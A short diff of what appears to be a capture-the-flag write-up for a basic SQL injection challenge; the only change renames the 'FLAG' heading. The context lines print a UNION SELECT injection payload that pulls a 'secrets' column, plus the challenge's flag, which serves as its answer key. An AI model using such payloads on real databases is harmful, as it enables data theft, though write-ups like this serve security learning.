@@ -21,5 +21,5 @@ basic sqli challenge that i thought was too overcomplicated for a while but late
 ' UNION SELECT secrets, NULL, NULL, NULL FROM CITADEL_ARCHIVE_2077 --
 ```
 <img width="1789" height="882" alt="image" src="https://github.com/user-attachments/assets/f9bed3a3-9afc-4d87-a196-5b4a0603af0a" />
-## FLAG
+## Flag
 `` CITADEL{571ll_d0n7_kn0w_1f_175_53qu3l_0r_5ql?} ``
